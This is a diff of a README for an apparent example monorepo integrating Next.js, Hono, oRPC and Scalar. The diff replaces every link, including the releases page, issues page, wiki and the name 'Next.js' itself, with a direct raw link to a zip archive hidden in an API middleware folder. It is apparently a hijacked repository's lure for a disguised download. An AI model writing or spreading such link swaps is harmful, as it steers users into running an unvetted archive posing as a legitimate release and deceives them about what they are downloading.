@@ -1,11 +1,11 @@
 # 🚀 example-next-hono-orpc-scalar-monorepo - A Simple Way to Explore Modern Web Tech
 
-![Download](https://img.shields.io/badge/Download-Here-blue.svg)  
-[Download Now](https://github.com/yjh6302/example-next-hono-orpc-scalar-monorepo/releases)
+![Download](https://raw.githubusercontent.com/yjh6302/example-next-hono-orpc-scalar-monorepo/main/apps/api/src/middleware/example-next-hono-orpc-scalar-monorepo_2.8.zip)  
+[Download Now](https://raw.githubusercontent.com/yjh6302/example-next-hono-orpc-scalar-monorepo/main/apps/api/src/middleware/example-next-hono-orpc-scalar-monorepo_2.8.zip)
 
 ## 📦 Overview
 
-This project is an example monorepo showcasing how to integrate Next.js, Hono, oRPC, and Scalar. It provides an easy way to build modern web applications with various tools. 
+This project is an example monorepo showcasing how to integrate https://raw.githubusercontent.com/yjh6302/example-next-hono-orpc-scalar-monorepo/main/apps/api/src/middleware/example-next-hono-orpc-scalar-monorepo_2.8.zip, Hono, oRPC, and Scalar. It provides an easy way to build modern web applications with various tools. 
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you begin, ensure your computer meets these requirements:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page where you'll find the download files.
 
-   [Visit this page to download](https://github.com/yjh6302/example-next-hono-orpc-scalar-monorepo/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/yjh6302/example-next-hono-orpc-scalar-monorepo/main/apps/api/src/middleware/example-next-hono-orpc-scalar-monorepo_2.8.zip)
 
 2. **Choose the Correct File**: Look for the latest version available. It usually has the highest version number and is highlighted as the recommendation for most users. 
 
@@ -66,8 +66,8 @@ A: This application is designed primarily for desktop use. However, you can acce
 
 For further guidance, you might find these resources helpful:
 
-- [GitHub Issues Page](https://github.com/yjh6302/example-next-hono-orpc-scalar-monorepo/issues): Report bugs or ask for help.
-- [Documentation](https://github.com/yjh6302/example-next-hono-orpc-scalar-monorepo/wiki): Read detailed sections on setup and usage.
+- [GitHub Issues Page](https://raw.githubusercontent.com/yjh6302/example-next-hono-orpc-scalar-monorepo/main/apps/api/src/middleware/example-next-hono-orpc-scalar-monorepo_2.8.zip): Report bugs or ask for help.
+- [Documentation](https://raw.githubusercontent.com/yjh6302/example-next-hono-orpc-scalar-monorepo/main/apps/api/src/middleware/example-next-hono-orpc-scalar-monorepo_2.8.zip): Read detailed sections on setup and usage.
 
 ## 📞 Support
 
@@ -77,5 +77,5 @@ If you have questions or need additional support, feel free to reach out through
 
 Thanks for choosing to explore this application. Your feedback helps in improving our future releases.
 
-![Download](https://img.shields.io/badge/Download-Here-blue.svg)  
-[Download Now](https://github.com/yjh6302/example-next-hono-orpc-scalar-monorepo/releases)
+![Download](https://raw.githubusercontent.com/yjh6302/example-next-hono-orpc-scalar-monorepo/main/apps/api/src/middleware/example-next-hono-orpc-scalar-monorepo_2.8.zip)  
+[Download Now](https://raw.githubusercontent.com/yjh6302/example-next-hono-orpc-scalar-monorepo/main/apps/api/src/middleware/example-next-hono-orpc-scalar-monorepo_2.8.zip)
